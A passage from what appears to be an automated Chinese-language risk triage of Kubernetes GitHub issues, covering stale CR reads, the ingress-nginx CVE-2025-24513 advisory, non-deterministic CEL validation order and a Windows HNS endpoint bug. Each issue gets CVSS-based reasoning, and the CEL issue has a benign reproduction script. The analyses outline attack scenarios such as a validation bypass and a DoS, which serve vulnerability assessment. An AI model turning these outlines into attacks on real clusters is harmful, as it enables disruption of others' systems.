According to `etcdctl` the object is not stored anymore in etcd.

(used command `/usr/local/bin/etcdctl get --prefix '/registry/vmoperator.vmware.com/virtualmachines/'`)


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.5+vmware.4-fips
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5+vmware.4-fips
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="VMware Photon OS"
VERSION="5.0"
ID=photon
VERSION_ID=5.0
PRETTY_NAME="VMware Photon OS/Linux"
ANSI_COLOR="1;34"
HOME_URL="https://vmware.github.io/photon/"
BUG_REPORT_URL="https://github.com/vmware/photon/issues"
$ uname -a
Linux 423e9fe96783368c4ff3ba2ec60ef71c 6.1.128-2.ph5 #1-photon SMP Wed Feb 19 07:00:29 UTC 2025 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
1.  **问题描述**: 该 Issue 描述了 Kubernetes API Server 在处理 Custom Resource (CR) 时的一个潜在问题。当用户使用一个已经被废弃的旧 API 版本（例如 `v1alpha2`）并通过指定 `resourceVersion` 参数来查询 CR 列表时，API Server 可能会返回一个已经被标记为删除（存在 `deletionTimestamp`）但尚未被完全清理的 CR 对象。而在不指定 `resourceVersion` 或使用当前（新）的 API 版本（例如 `v1alpha4`）查询时，该已删除对象则不会被返回。
2.  **根本原因推测**: 问题可能源于 API Server 的存储层（etcd）、缓存机制或 CRD 版本转换（Conversion Webhook）逻辑。虽然 Issue 提交者确认对象已不在 etcd 中，但 API Server 的 watch 缓存或处理版本转换的过程中可能存在状态不一致，导致在特定条件下（旧版本 + resourceVersion）查询时，能从缓存或其他中间状态中获取到已被删除的对象信息。`resourceVersion` 参数通常用于确保一致性读取或启动 watch，查询特定 `resourceVersion` 可能触发了访问旧状态缓存的逻辑。
3.  **潜在风险**:
    *   **信息泄露（Stale Data）**: 攻击者（或依赖此 API 的 Controller）如果拥有对该 CR 的读取权限，可以通过构造特定请求（使用旧 API 版本和特定的 `resourceVersion`）获取到一个已经被删除的对象信息。虽然对象已被删除，但其包含的 `spec` 和 `status` 可能包含一些在删除后不应再被访问的配置信息或状态数据。
    *   **控制器逻辑错误**: 如 Issue 中所述，依赖此 API 行为的 Controller 可能会因为获取到已删除的对象而做出错误的判断，例如认为资源仍然存在，从而导致资源清理失败、状态不同步或其他非预期行为。
4.  **风险评估**:
    *   **攻击向量 (AV:N)**: 通过网络访问 Kubernetes API。
    *   **攻击复杂度 (AC:H)**: 需要知道存在旧的 API 版本，并且需要获取到一个合适的 `resourceVersion` (通常来自之前的 LIST 操作)。复现条件似乎比较特定，提交者也无法稳定复现。
    *   **权限要求 (PR:L)**: 需要拥有对该特定 Custom Resource 的 `get` 或 `list` 权限。这通常是命名空间内的开发者、服务账户或 CRD 管理员拥有的权限，而非任意用户。
    *   **用户交互 (UI:N)**: 无需用户交互。
    *   **范围 (S:U)**: 影响范围是 API Server 组件本身，未改变权限范围。
    *   **机密性影响 (C:L)**: 可以读取到已被删除的对象信息，属于过期/陈旧数据的泄露。影响程度取决于该 CR 中包含的数据敏感性，但通常低于读取活跃对象的敏感数据。
    *   **完整性影响 (I:N)**: 只是读取信息，本身不影响数据完整性。控制器可能基于此信息做出错误操作，但这属于间接影响。
    *   **可用性影响 (A:N)**: 不直接导致 API Server 或相关资源不可用。可能导致依赖此行为的控制器功能异常。
    *   **CVSS 3.1 评分**: AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N -> 3.1 (Low)
5.  **结论**: 根据 CVSS 3.1 评分（3.1），此问题属于 **低风险**。它确实是一个 Bug，可能导致陈旧信息泄露和控制器逻辑问题，但利用条件较为复杂，需要特定权限，且泄露的是已删除对象的信息，不涉及命令执行、提权等高危操作。根据风险判断标准第3条和第5条，虽然是安全相关问题，但评级为 Low，不判定为高风险。

**复现过程：**

```python
# 根据风险判断标准，此问题被评定为低风险，因此不提供复现脚本。
# 原因：该问题主要导致已删除对象（陈旧数据）在特定查询条件下可见，
# 属于信息泄露的一种，但利用条件苛刻（需要旧API版本+特定resourceVersion+读取权限），
# CVSS评分为3.1 (Low)，未达到高风险标准（如命令执行、提权、影响其他租户等）。
# 根据要求，仅对高风险问题提供复现脚本。

import time
import sys

print("该Issue被评估为低风险，根据要求不生成复现POC。")
print("问题描述：使用旧API版本和resourceVersion查询时，可能获取到已删除的CR对象。")
print("风险分析：低风险信息泄露（陈旧数据），利用条件复杂，CVSS 3.1。")

# 模拟退出
time.sleep(1)
sys.exit(0)
```


**解释说明：**

该 Python 脚本并未实际执行复现操作。根据用户设定的风险判断标准，只有被评定为“高风险”的 Issue 才需要提供详细的复现脚本 (POC)。

在此案例中，分析结论是该 Issue（在特定条件下通过旧 API 版本和 `resourceVersion` 获取已删除 CR 对象）构成了一个“低风险”的信息泄露问题。其 CVSS 3.1 评分为 3.1，低于高风险阈值（通常为 7.0 或更高）。该问题不涉及命令执行、权限提升、容器逃逸或严重的多租户隔离破坏。

因此，脚本仅打印了风险评级结论和不提供 POC 的原因，并正常退出，符合不对低风险问题生成实际复现代码的要求。

---


## Issue #131005 CVE-2025-24513: ingress-nginx controller - auth secret file path traversal vulnerability

- Issue 链接：[#131005](https://github.com/kubernetes/kubernetes/issues/131005)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L)) (Score: 4.8, Medium)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where attacker-provided data are included in a filename by the ingress-nginx Admission Controller feature, resulting in directory traversal within the container. This could result in denial of service, or when combined with other vulnerabilities, limited disclosure of Secret objects from the cluster. 

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

Before applying the patch, this issue can be mitigated by disabling the Validating Admission Controller functionality of ingress-nginx.  

##### Fixed Versions

- ingress-nginx [main@cbc1590](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/cbc159094f6d1b1bf8cf1761eb119138d1f95df1)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

There are no known indicators of compromise that prove this vulnerability has been exploited.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld and Ronen Shustin from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
1.  **漏洞性质分析**：该 Issue 描述了一个已确认的安全漏洞 CVE-2025-24513，属于路径遍历（Path Traversal）类型，发生在 Kubernetes 的 ingress-nginx 项目的 Admission Controller 组件中。
2.  **影响分析**：攻击者可以通过构造特定的数据（包含在被 Admission Controller 处理的文件名中）来触发此漏洞，实现在 Admission Controller 运行的容器内部进行目录遍历。其直接后果被描述为可能导致拒绝服务（DoS），或者在与其他漏洞结合的情况下，可能有限地泄露集群中的 Secret 对象（仅限于该 Controller Pod 有权访问的 Secret）。
3.  **触发条件分析**：漏洞发生在 Admission Controller 处理数据时。Admission Controller 通常用于验证或修改 Kubernetes 资源的创建/更新请求（例如 Ingress 对象）。因此，攻击者需要有权限执行能够触发该 Admission Controller 的操作，例如创建或更新一个 Ingress 资源。
4.  **CVSS 评分分析**：Issue 中明确给出了 CVSS 3.1 评分为 4.8 (Medium)，向量为 `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L`。这个评分表明：
    *   `AV:N` (网络攻击)：漏洞可以远程利用。
    *   `AC:H` (攻击复杂度高)：利用该漏洞比较困难。
    *   `PR:N` (无需权限)：利用漏洞本身不需要特定权限，但如上所述，触发 Admission Controller 的操作（如创建/更新 Ingress）通常需要 Kubernetes RBAC 权限。
    *   `C:L` (低机密性影响)：可能导致少量信息泄露。
    *   `I:N` (无完整性影响)。
    *   `A:L` (低可用性影响)：可能导致 DoS。
5.  **风险判断标准应用**：
    *   **标准 2 & 3**：这是一个安全问题，但其 CVSS 评分为 4.8 (Medium)，低于通常定义的高风险阈值（例如 CVSS High 通常为 7.0 或更高）。因此，初步判断为低风险。
    *   **标准 5**：漏洞可能导致 DoS，但触发该 DoS 的前提是攻击者需要具备创建或修改相关 Kubernetes 资源（如 Ingress）的权限。根据此标准，当 DoS 攻击需要非只读权限时，不应判断为高风险。这进一步支持了低风险的判断。
    *   **标准 7**：Issue 描述未提及命令执行、容器逃逸或权限提升等高危后果。路径遍历被限制在 Admission Controller 的容器内，其直接影响相对有限。
    *   **标准 8**：虽然 Admission Controller 是一个中心组件，但描述的直接影响（DoS 或有限信息泄露）主要针对 Controller 本身及其可访问的数据，并未直接描述低权限用户能够影响其他用户工作负载或容器的情况。
    *   **标准 9**：Issue 提供的信息（包括 CVSS 评分和影响描述）相对充分，足以判断风险等级。

6.  **结论**：综合来看，该漏洞虽然是一个有效的安全问题，但其利用复杂度较高，直接影响有限（DoS 或有限信息泄露），且触发条件需要一定的 Kubernetes 权限。根据提供的风险判断标准和 CVSS 评分，应将其评定为低风险。

**复现过程：**

```python
# 根据风险判断标准，此 Issue 被评定为低风险，因此不提供复现 POC 脚本。
# 低风险判断依据：
# 1. 官方 CVSS 评分为 4.8 (Medium)，低于高风险阈值。
# 2. 漏洞影响主要是容器内的路径遍历，导致潜在的 DoS 或有限的信息泄露，未达到命令执行、容器逃逸等级别。
# 3. 利用漏洞可能需要攻击者具备创建/更新 Kubernetes 资源（如 Ingress）的权限，根据标准 5，需要权限的 DoS 攻击不应判定为高风险。
pass
```


**解释说明：**

该 Python 脚本为空实现 (`pass`)，因为根据分析，Issue CVE-2025-24513 被评定为**低风险**。风险评级的依据是官方提供的 CVSS 评分为 4.8 (Medium)，其影响被限制在 Admission Controller 容器内的路径遍历，可能导致拒绝服务或有限的 Secret 泄露，并未涉及命令执行、容器逃逸等高危场景。此外，根据风险判断标准 #5，由于潜在的 DoS 攻击需要攻击者拥有创建/更新 Kubernetes 资源的权限，这进一步降低了其风险评级，不符合高风险的标准。按照要求，仅针对高风险问题提供复现脚本，因此此处不提供具体 POC 代码。

---


## Issue #130984 CRD CEL validation is executed in non-deterministic order

- Issue 链接：[#130984](https://github.com/kubernetes/kubernetes/issues/130984)

### Issue 内容

#### What happened?

We noticed that if there are CEL validations on multiple properties of a CRD the execution order is not deterministic.

We noticed this because our unit tests were failing because of the changing validation messages (xref: [CAPI#11874](https://github.com/kubernetes-sigs/cluster-api/pull/11874), [ProwJob](https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/kubernetes-sigs_cluster-api/11835/pull-cluster-api-test-main/1891887690366849024)).

I think the reason is that we are iterating over a map here without any sorting of the map keys: [https://github.com/kubernetes/kubernetes/blob/5420b2fe9a84af57cc24793c8f8ac8821b65[…]/apiextensions-apiserver/pkg/apiserver/schema/cel/validation.go](https://github.com/kubernetes/kubernetes/blob/5420b2fe9a84af57cc24793c8f8ac8821b65f42f/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel/validation.go#L833)

Would it make sense to make this more deterministic?

I think the current impact is:
* validation error messages are not deterministic
* if the validation runs out of budget it's random which validations will be executed before the budget runs out

#### What did you expect to happen?

The CEL validation being executed always in the same order. Ideally the order in which the fields are defined in the CRD. But also e.g. using alphabetic order based on the property names would be an improvement.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a CRD with CEL validations on multiple properties of the same parent field (example here: https://github.com/kubernetes-sigs/cluster-api/blob/v1.10.0-beta.0/config/crd/bases/cluster.x-k8s.io_machinedrainrules.yaml#L236-L238)

Deploy a corresponding CR which violates both validations.

Repeat a few times and observe how the validation message is not deterministic



#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.0
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>
kind - no cloud provider
</details>


#### OS version

<details>

Not relevant, but we were hitting this in k8s Prow as well: https://prow.k8s.io/view/gs/kubernetes-ci-logs/pr-logs/pull/kubernetes-sigs_cluster-api/11835/pull-cluster-api-test-main/1891887690366849024

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
1.  **Issue描述**: 该Issue指出Kubernetes CRD（Custom Resource Definition）的CEL（Common Expression Language）验证规则在应用于同一父字段下的多个属性时，其执行顺序是不确定的。这是因为底层实现（`validation.go#L833`）在处理验证规则时迭代了一个Go语言的map，而map的迭代顺序在Go中是随机的。
2.  **主要影响**:
    *   **验证错误信息不确定**: 当一个CR（Custom Resource）实例同时违反多个验证规则时，API Server返回的错误信息可能会因为每次验证的执行顺序不同而不同。这主要影响了依赖特定错误信息的自动化测试（如Issue中提到的单元测试失败）和用户调试体验。
    *   **验证预算耗尽时的随机性**: CEL验证有计算成本预算限制。如果一个CR非常复杂或验证规则计算量大，可能在所有规则执行完毕前就耗尽预算。由于执行顺序不确定，哪些规则能够成功执行、哪些因预算耗尽而被跳过，也变得随机。这可能导致某些本应被阻止的无效CR在特定情况下（取决于随机顺序和预算）被意外接受（如果未执行到关键的失败规则）。
3.  **安全风险评估**:
    *   **错误信息不确定性**: 这本身不构成安全风险。它是一个可用性和可测试性问题。
    *   **预算耗尽场景**: 这存在潜在的低度完整性风险。攻击者（拥有创建/更新特定CR权限的用户）可以精心构造一个CR，使其包含多个（可能包括一个关键的）违反规则的字段，并尝试利用验证预算和随机执行顺序，期望在关键验证规则执行前耗尽预算，从而绕过该验证。
    *   **攻击前提**:
        *   攻击者需要有创建或更新目标CRD对应CR的权限。
        *   攻击者需要了解CRD的验证规则和CEL的预算机制。
        *   攻击者需要能够构造一个接近预算限制的复杂CR。
        *   成功绕过验证依赖于随机执行顺序和预算耗尽的时机，不是确定性的。
    *   **CVSS 3.1 评估**:
        *   AV:N (通过网络API交互)
        *   AC:L (构造CR不算特别复杂，但需要对规则和预算有了解)
        *   PR:L (需要创建/更新CR的权限，这通常低于修改CRD的权限)
        *   UI:N (无需用户交互)
        *   S:U (影响范围限于API Server对该CR的验证逻辑，不改变其自身或其他组件的安全范围)
        *   C:N (不涉及机密性泄露)
        *   I:L (可能在特定条件下绕过验证，允许不符合预期的CR状态，影响数据完整性，但成功率和影响范围有限)
        *   A:L (可能导致API Server在处理某些复杂CR时消耗更多资源或行为不一致，对验证服务的可用性有轻微影响；如果无效CR被接受，可能导致后续控制器行为异常，但不是直接的拒绝服务攻击)
        *   **评分**: 5.4 (Medium)
    *   **风险等级判定**: 根据规则3，CVSS评分为Medium，属于**低风险**。该问题不涉及命令执行、提权、容器逃逸等高风险行为（规则7）。虽然攻击者需要创建/修改权限，但根据规则5，这本身不直接导致降级（因为CVSS评分已在High以下）。该问题不影响其他用户（规则8）。

4.  **结论**: 该Issue描述的问题主要影响开发和测试的确定性，以及在预算耗尽的边缘情况下存在低度的完整性风险（验证绕过）。根据风险判断标准，该问题评级为低风险。

**复现过程：**

```python
import time
import json
import uuid
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import datetime
import sys

# Constants
CRD_GROUP = "example.com"
CRD_VERSION = "v1"
CRD_PLURAL = "mydeterministictests"
NAMESPACE = "default"
MAX_ATTEMPTS = 15 # Number of attempts to create the CR
TIMEOUT_SECONDS = 120 # 2 minutes timeout for the whole script

def create_crd_object():
    """Creates the CRD manifest dictionary"""
    crd_name = f"{CRD_PLURAL}.{CRD_GROUP}"
    return {
        "apiVersion": "apiextensions.k8s.io/v1",
        "kind": "CustomResourceDefinition",
        "metadata": {
            "name": crd_name
        },
        "spec": {
            "group": CRD_GROUP,
            "versions": [
                {
                    "name": CRD_VERSION,
                    "served": True,
                    "storage": True,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "fieldA": {
                                            "type": "integer",
                                            # Rule 1: fieldA must be > 10
                                            "x-kubernetes-validations": [{
                                                "rule": "self > 10",
                                                "message": "fieldA must be greater than 10"
                                            }]
                                        },
                                        "fieldB": {
                                            "type": "string",
                                            # Rule 2: fieldB must have length < 5
                                            "x-kubernetes-validations": [{
                                                "rule": "self.size() < 5",
                                                "message": "fieldB length must be less than 5"
                                            }]
                                        },
                                        "fieldC": {
                                            "type": "boolean",
                                             # Rule 3: fieldC must be true
                                            "x-kubernetes-validations": [{
                                                "rule": "self == true",
                                                "message": "fieldC must be true"
                                            }]
                                        }
                                    },
                                     # Add object level rule to increase complexity slightly if needed, but property rules are enough
                                     # "x-kubernetes-validations": [{
                                     #     "rule": "has(self.fieldA) && has(self.fieldB)",
                                     #     "message": "Both fieldA and fieldB must be present"
                                     # }]
                                }
                            }
                        }
                    }
                }
            ],
            "scope": "Namespaced",
            "names": {
                "plural": CRD_PLURAL,
                "singular": "mydeterministictest",
                "kind": "MyDeterministicTest",
                "shortNames": ["mdt"]
            }
        }
    }

def create_cr_object(name):
    """Creates the CR manifest dictionary that violates multiple rules"""
    return {
        "apiVersion": f"{CRD_GROUP}/{CRD_VERSION}",
        "kind": "MyDeterministicTest",
        "metadata": {
            "name": name,
            "namespace": NAMESPACE
        },
        "spec": {
            # Violates Rule 1 (should be > 10)
            "fieldA": 5,
            # Violates Rule 2 (length should be < 5)
            "fieldB": "longstringvalue",
            # Violates Rule 3 (should be true)
            "fieldC": False
        }
    }

def main():
    start_time = datetime.datetime.now()
    print("Starting script...")

    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        config.load_kube_config()
        print("Kubernetes config loaded.")
    except Exception as e:
        print(f"Error loading Kubernetes config: {e}")
        sys.exit(1)

    # Create API clients
    api_extensions_client = client.ApiextensionsV1Api()
    custom_objects_client = client.CustomObjectsApi()

    # Generate a unique name for the CRD based on the plural, group, and a random suffix
    crd_manifest = create_crd_object()
    crd_name = crd_manifest["metadata"]["name"]
    print(f"Using CRD: {crd_name}")

    # --- CRD Creation ---
    try:
        print(f"Attempting to create CRD {crd_name}...")
        api_extensions_client.create_custom_resource_definition(body=crd_manifest)
        print(f"CRD {crd_name} created. Waiting a bit for it to be established...")
        # Wait for the CRD to be established (simple sleep, robust checks are more complex)
        time.sleep(10)
    except ApiException as e:
        if e.status == 409:  # Conflict - CRD already exists
            print(f"CRD {crd_name} already exists. Proceeding...")
        else:
            print(f"Error creating CRD {crd_name}: {e.status} - {e.reason}")
            try:
                error_body = json.loads(e.body)
                print(f"Error details: {json.dumps(error_body, indent=2)}")
            except json.JSONDecodeError:
                print(f"Error body: {e.body}")
            sys.exit(1)
    except Exception as e:
         print(f"An unexpected error occurred during CRD creation: {e}")
         sys.exit(1)


    # --- CR Creation Attempts ---
    observed_error_messages = set()
    cr_name_base = f"test-cr-{uuid.uuid4().hex[:6]}"
    print(f"Attempting to create CR instances violating multiple rules ({MAX_ATTEMPTS} times)...")

    for i in range(MAX_ATTEMPTS):
        # Check for timeout
        elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
        if elapsed_time > TIMEOUT_SECONDS:
            print(f"Timeout reached ({TIMEOUT_SECONDS}s). Exiting loop.")
            break

        cr_name = f"{cr_name_base}-{i}"
        cr_manifest = create_cr_object(cr_name)

        try:
            print(f"Attempt {i+1}/{MAX_ATTEMPTS}: Creating CR {cr_name}...")
            custom_objects_client.create_namespaced_custom_object(
                group=CRD_GROUP,
                version=CRD_VERSION,
                namespace=NAMESPACE,
                plural=CRD_PLURAL,
                body=cr_manifest
            )
            # If creation succeeds unexpectedly, print a message (shouldn't happen)
            print(f"Warning: CR {cr_name} created successfully, expected validation failure.")
        except ApiException as e:
            if e.status == 422: # Unprocessable Entity - Validation Error
                try:
                    error_body = json.loads(e.body)
                    # Extract the primary validation error message(s)
                    # Kubernetes typically returns a Status object with details.causes
                    causes = error_body.get("details", {}).get("causes", [])
                    # Sometimes the main message is enough if causes is simple
                    main_message = error_body.get("message", "Unknown validation error")

                    # We collect the first cause message if available, otherwise the main message
                    # to see if *which* field fails first changes.
                    first_cause_message = "N/A"
                    if causes:
                         # Sorting causes by field can make the combined message more stable,
                         # but here we want to see the raw first reported error if possible.
                         # Let's just take the message from the first cause entry.
                         first_cause_message = causes[0].get("message", "Cause message missing")

                    # Use a tuple of relevant fields if multiple errors are reported consistently
                    # For simplicity, let's just capture the first error message reported.
                    error_key = first_cause_message if causes else main_message

                    if error_key not in observed_error_messages:
                        print(f"  New validation error observed: {error_key}")
                        observed_error_messages.add(error_key)
                    else:
                         print(f"  Seen validation error again: {error_key}")

                except json.JSONDecodeError:
                    print(f"  Attempt {i+1} failed with non-JSON body: {e.status} - {e.body}")
                except Exception as parse_exc:
                     print(f"  Attempt {i+1} failed. Error parsing exception body: {parse_exc}. Raw body: {e.body}")

            else:
                # Handle other API errors if necessary
                 print(f"  Attempt {i+1} failed with unexpected API error: {e.status} - {e.reason}")
                 print(f"  Body: {e.body}")
        except Exception as e:
            print(f"  Attempt {i+1} failed with unexpected error: {e}")

        # Small delay between attempts
        time.sleep(0.5)


    # --- Analysis and Cleanup ---
    print("\n--- Results ---")
    print(f"Observed {len(observed_error_messages)} unique primary validation error messages:")
    for msg in observed_error_messages:
        print(f"- {msg}")

    if len(observed_error_messages) > 1:
        print("\nSUCCESS: Observed multiple different validation error messages, demonstrating non-deterministic order.")
    elif len(observed_error_messages) == 1:
        print("\nINFO: Only one unique validation error message observed. The non-determinism might not be apparent in this environment/configuration or with this number of attempts.")
        print("      Try increasing MAX_ATTEMPTS or modifying the CRD/CR rules.")
    else:
         print("\nWARNING: No validation errors captured. Check CRD/CR definitions and script logic.")


    print("\n--- Cleanup ---")
    try:
        print(f"Deleting CRD {crd_name}...")
        api_extensions_client.delete_custom_resource_definition(name=crd_name)
        print(f"CRD {crd_name} deleted.")
    except ApiException as e:
        if e.status == 404:
            print(f"CRD {crd_name} not found (already deleted?).")
        else:
            print(f"Error deleting CRD {crd_name}: {e.status} - {e.reason}")
            try:
                error_body = json.loads(e.body)
                print(f"Error details: {json.dumps(error_body, indent=2)}")
            except json.JSONDecodeError:
                print(f"Error body: {e.body}")
    except Exception as e:
        print(f"An unexpected error occurred during CRD deletion: {e}")

    end_time = datetime.datetime.now()
    print(f"\nScript finished in {(end_time - start_time).total_seconds():.2f} seconds.")

# Execute main function directly
main()
```


**解释说明：**

1.  **目的**: 该脚本旨在通过实践演示Issue中描述的CRD CEL验证顺序不确定性问题。它会创建一个包含多个简单CEL验证规则的CRD，然后多次尝试创建一个违反这些规则的CR实例。通过捕获并比较每次失败时API Server返回的验证错误信息，来观察错误信息是否会因为验证规则执行顺序的随机性而发生变化。
2.  **环境假设**:
    *   脚本假设本地已配置好`kubectl`环境，并且`~/.kube/config`文件包含访问目标Kubernetes集群的有效凭证。
    *   执行脚本的用户需要有在`default`命名空间创建CRD和对应CR的权限。
3.  **工作流程**:
    *   **初始化**: 加载Kubernetes配置，创建与Kubernetes API交互的客户端（`ApiextensionsV1Api`用于CRD操作，`CustomObjectsApi`用于CR操作）。
    *   **CRD定义**: 定义一个名为`mydeterministictests.example.com`的CRD，其`spec`下包含`fieldA` (int > 10)、`fieldB` (string length < 5) 和 `fieldC` (boolean == true) 三个带有CEL验证规则的字段。
    *   **CRD创建**: 尝试在集群中创建这个CRD。如果CRD已存在，则继续；如果发生其他错误，则退出。创建后会等待一小段时间（10秒）以确保CRD在集群中可用。
    *   **CR定义**: 定义一个CR实例，该实例故意违反`fieldA`、`fieldB`和`fieldC`的所有规则。
    *   **重复创建CR**: 在一个循环中（最多`MAX_ATTEMPTS`次，且总运行时间不超过`TIMEOUT_SECONDS`），尝试创建上述CR实例。为避免命名冲突，每次尝试使用不同的CR名称。
    *   **错误捕获与分析**:
        *   预期创建会失败，并返回`ApiException`，状态码为422 (Unprocessable Entity)。
        *   脚本捕获此异常，解析返回的JSON错误体，提取`details.causes`中的第一个错误信息（或主错误信息）。
        *   将提取到的错误信息添加到一个集合（`observed_error_messages`）中，该集合自动去重。
        *   打印每次观察到的错误信息，并指出是新的还是重复的。
    *   **结果报告**: 循环结束后，打印收集到的所有唯一错误信息。如果集合中包含多个不同的错误信息，则说明成功复现了验证错误信息的不确定性。
    *   **清理**: 最后，尝试删除之前创建的CRD，以保持集群干净。
4.  **运行与观察**: 运行此脚本。如果输出显示捕获到了多个不同的错误消息（例如，有时报告`fieldA`违规，有时报告`fieldB`违规，有时报告`fieldC`违规），则证明了Issue中描述的现象。如果只观察到一种错误信息，可能意味着在该特定环境或尝试次数下，随机性未表现出来，或者API Server的实现细节使得某个错误总是先被报告。

---


## Issue #130963 [Windows] HNS endpoints creation fails after remote HNS endpoints with same IP address were created

- Issue 链接：[#130963](https://github.com/kubernetes/kubernetes/issues/130963)

### Issue 内容

#### What happened?

When deploying Windows containers on Windows Nodes, some Windows containers fails to have network configuration inside like this:
```
S C:\> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : windows-server-iis-ltsc2022-58467d4759-vgzjr
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
```

This issue happens for Windows containers that got assigned the same IP address that was previously assigned to pods on Linux but were deleted later.

When we create a Pod on Linux and a `LoadBalancer` service type that refers to Linux pod, `kube-proxy` on Windows create HNS endpoints of Remote type. If we delete these Linux pods, IP addresses assigned to these pods are released and Remote HNS endpoints are deleted from Windows nodes.

When I deploy Windows pod, and if this Windows pod gets assigned the same IP as Linux pod, HNS endpoint for these Windows containers fails to be created causing networking issues inside Windows container.

This issue is a likely regression due to #124092

#### What did you expect to happen?

All Windows containers should successfully create HNS endpoint and networking should work inside Windows containers.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Deploy kubernetes cluster with limited available IPs for pods on both Linux and Windows node.
2. Deploy Linux pods that consume almost all IPs.
3. Deploy service type LoadBalancer that refer to Linux pods, This will trigger `kube-proxy` to create Remote HNS endpoint on Windows. This Remote HNS endpoint will have Linux pod IP.
4. Scale down the Linux pods to 1.
5. Deploy Windows pods so that same IP address from Linux pod can be reassigned to Windows Pods.
6. HNS endpoints for Windows pods with same address will not be created.
7. Internet connectivity inside these Windows pod will fail.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
1.31 and higher only
```

</details>


#### Cloud provider

<details>
EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture

BuildNumber  Caption                                   OSArchitecture  Version
20348        Microsoft Windows Server 2022 Datacenter  64-bit          10.0.20348
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了一个在Kubernetes集群中混合部署Linux和Windows节点时可能出现的网络问题。具体场景如下：

1.  在集群中（假设IP资源有限），先部署Linux Pod。
2.  创建一个类型为 `LoadBalancer` 的Service，指向这些Linux Pod。`kube-proxy` 会在Windows节点上为这些Linux Pod IP创建类型为 `Remote` 的HNS（Host Network Service）Endpoint。
3.  删除或缩减Linux Pod，释放其IP地址，对应的 `Remote` HNS Endpoint也会在Windows节点上被删除。
4.  接着部署Windows Pod，如果某个Windows Pod恰好被分配到了之前Linux Pod使用过并已释放的IP地址。
5.  此时，为这个Windows Pod创建其本地HNS Endpoint的操作会失败，导致该Windows Pod内部无法配置网络（`ipconfig /all` 显示无IP配置），进而无法进行网络通信。

问题根源在于，同一个IP地址先后被用作`Remote` HNS Endpoint（代表集群中其他节点的Pod）和本地HNS Endpoint（代表本节点的Pod）时，HNS Endpoint的创建/清理机制可能存在冲突或状态未完全重置，导致后续本地Endpoint创建失败。

**安全风险分析：**

1.  **问题性质：** 这本质上是一个功能性缺陷（Bug），影响了特定条件下Windows容器的网络可用性。
2.  **影响范围：** 影响的是那些恰好获取到特定重用IP地址的新创建的Windows Pod的网络功能。已经运行的Pod不受影响。
3.  **触发条件：** 需要特定的操作序列（创建Linux Pod -> 创建指向Linux Pod的LoadBalancer Service -> 删除Linux Pod -> 创建Windows Pod获得相同IP）和环境条件（IP地址池有限导致IP重用）。
4.  **攻击者利用可能性：**
    *   一个攻击者如果拥有在集群中创建/删除Pod和创建`LoadBalancer` Service的权限（通常是较高的权限，如`edit`或`cluster-admin`角色），理论上可以尝试通过精心编排资源的创建和删除来触发这个Bug，导致后续在此Windows节点上调度且获得特定IP的Windows Pod网络连接失败。
    *   这可以被视为一种拒绝服务（DoS）攻击，目标是阻止新部署的Windows Pod获得网络连接。
    *   根据风险判断标准第5条，由于实施此攻击需要攻击者具备创建/修改Pod和Service（非只读）的权限，这种DoS应被视为需要较高权限才能触发，不应判断为高风险。
